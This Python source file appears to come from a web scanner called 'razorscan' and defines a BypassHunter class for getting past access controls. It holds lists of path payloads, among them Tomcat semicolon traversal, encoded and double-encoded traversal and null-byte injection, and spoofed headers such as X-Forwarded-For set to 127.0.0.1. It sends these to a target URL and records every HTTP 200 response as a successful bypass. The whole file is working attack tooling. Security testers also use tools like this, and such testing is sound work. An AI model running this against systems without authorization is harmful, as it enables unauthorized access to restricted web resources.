import httpx
from typing import List, Dict
from razorscan.core.requester import RazorRequester

class BypassHunter:
    # Teknik bypass tingkat lanjut
    BYPASS_PAYLOADS = [
        {"path_suffix": "/..;/", "desc": "Tomcat Semicolon Bypass"},
        {"path_suffix": "/%2e%2e%2f", "desc": "URL Encoded Traversal"},
        {"path_suffix": "/%252e%252e%252f", "desc": "Double Encoded Traversal"},
        {"path_suffix": "/..%00/", "desc": "Null Byte Injection"},
        {"path_suffix": "/??/", "desc": "Wildcard Bypass"},
        {"path_suffix": "/.", "desc": "Trailing Dot Bypass"},
    ]

    BYPASS_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Host": "localhost"},
        {"Forwarded": "for=127.0.0.1;proto=http"},
    ]

    def __init__(self, requester: RazorRequester):
        self.requester = requester

    async def try_bypass(self, url: str) -> List[Dict]:
        success_findings = []
        base_url = url.rstrip("/")

        # 1. Test Path-based Bypasses
        for payload in self.BYPASS_PAYLOADS:
            target_url = f"{base_url}{payload['path_suffix']}"
            resp = await self.requester.fetch(target_url)
            if resp and resp.status_code == 200:
                success_findings.append({
                    "url": target_url,
                    "method": "Path Manipulation",
                    "payload": payload["desc"]
                })

        # 2. Test Header-based Bypasses
        for header in self.BYPASS_HEADERS:
            resp = await self.requester.fetch(url, headers=header)
            if resp and resp.status_code == 200:
                success_findings.append({
                    "url": url,
                    "method": "Header Manipulation",
                    "payload": str(header)
                })

        return success_findings

